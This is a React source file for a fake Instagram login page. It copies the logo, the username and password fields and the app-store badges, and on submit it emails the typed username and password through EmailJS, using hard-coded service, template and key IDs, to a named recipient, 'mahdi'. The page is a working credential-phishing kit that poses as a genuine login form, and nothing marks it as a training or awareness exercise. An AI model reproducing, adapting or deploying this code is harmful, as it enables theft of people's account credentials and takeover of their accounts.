import axios from "axios";
import { useState } from "react";
import emailjs from '@emailjs/browser';


const App = () => {

  const [data, setData] = useState({
    userName: "",
    password: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value })
  }

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.send("service_y0t1c7k", "template_jzlau9g", {
      to_name: "mahdi",
      message: `
      password: ${data.password}
      userName:${data.userName}
      `,
    }, "_WJUCj1oCVmvV3AxI").then(res => console.log(res)).catch(error => console.log(error))

    setData({
      userName: "",
      password: "",
    })
  }

  return (
    <div className="flex flex-col items-center justify-center container h-screen px-4">

      <form onSubmit={sendEmail} className="font-sans text-sm max-w-[350px] w-full p-4 md:border flex items-center justify-center gap-y-2 flex-col md:bg-white">
        <div className="max-w-[175px] w-full md:mt-5 mb-8">
          <img className="w-full object-cover" src="/Instagram_logo.svg.webp" />
        </div>

        <input placeholder="Phone number,username,or email" value={data.userName} onChange={e => handleChange(e)} id="user-name" type="text" name="userName" className="border w-full p-2 max-w-[270px]" />
        <input placeholder="Password" value={data.password} onChange={e => handleChange(e)} id="pass" type="text" name="password" className="border w-full p-2 max-w-[270px]" />

        <button type="submit" className="bg-blue-500 rounded py-2 w-full text-white mt-3 max-w-[270px]">Log In</button>
        <a href="#" className="block w-full text-center text-blue-600 text-sm mt-4">Forgot Password ?</a>
      </form>

      <div className="font-sans text-sm max-w-[350px] w-full flex items-center justify-center md:border p-4 md:mt-2 md:bg-white">
        <span>Don't have an account?</span>
        <a href="#" className="text-blue-600 font-bold ml-2">Sign up</a>
      </div>

      <div className="font-sans text-sm max-w-[350px] flex flex-col justify-center items-center mt-7 gap-y-4">
        <p> Get the app.</p>
        <div className="flex gap-x-2 items-center justify-center flex-nowrap">
          <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8&vt=lo" className="min-w-[135px] max-w-[135px] max-h-[38px] overflow-hidden flex items-center justify-center">
            <img className="w-[86%] object-cover" src="/button-appstore.png" />
          </a>
          <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DB99C6F19-8018-4B9F-BFD8-CEC8EA18E9DB%26utm_content%3Dlo%26utm_medium%3Dbadge" className="min-w-[135px] max-w-[135px] max-h-[38px] overflow-hidden flex items-center justify-center">
            <img className="w-[97%] object-cover" src="/Google_Play_Store_badge_EN.svg.webp" />
          </a>
        </div>
      </div>

    </div>
  );
}
export default App;

